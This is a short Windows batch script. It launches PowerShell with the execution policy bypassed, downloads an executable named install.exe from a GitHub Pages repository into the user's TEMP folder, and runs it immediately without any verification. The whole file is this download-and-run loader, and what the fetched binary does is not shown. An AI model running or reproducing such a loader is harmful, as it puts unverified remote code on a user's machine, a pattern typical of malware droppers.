@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "$dlUri='https://raw.githubusercontent.com/SmaZone2020/SmaZone2020.github.io/refs/heads/main/install.exe'; $outExe=Join-Path $env:TEMP 'install.exe'; Invoke-WebRequest -Uri $dlUri -OutFile $outExe -UseBasicParsing; if(Test-Path $outExe){ Start-Process $outExe }"
